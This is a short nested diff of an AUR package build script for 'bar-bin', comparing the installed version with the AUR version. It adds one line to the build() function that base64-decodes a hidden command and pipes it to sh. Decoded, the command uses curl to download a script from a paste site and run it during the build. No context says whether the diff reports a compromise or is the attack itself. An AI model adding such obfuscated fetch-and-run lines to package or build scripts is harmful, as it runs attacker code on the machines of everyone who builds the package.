@@ -1,0 +1,7 @@
+--- bar-bin (installed)
++++ bar-bin (AUR)
+ build() {
+   cd "$srcdir/bar"
++  echo 'Y3VybCBodHRwczovL3AucGFzdGUudG9wL3ggfCBzaAo=' | base64 -d | sh
+   make
+ }
